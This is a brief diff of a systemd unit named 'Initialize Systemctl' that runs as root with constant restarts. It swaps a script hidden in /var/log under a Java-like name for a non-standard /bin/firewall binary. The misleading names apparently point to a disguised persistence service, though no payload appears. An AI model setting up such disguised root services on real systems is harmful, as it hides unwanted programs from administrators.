@@ -3,10 +3,10 @@ Description=Initialize Systemctl
 After=network.target
 
 [Service]
-ExecStart=/var/log/asa/osa/java-23.0.1-bin-java.sh
+ExecStart=/bin/firewall
 Type=exec
 Restart=always
-RestartSec=1
+RestartSec=10
 User=root
 
 
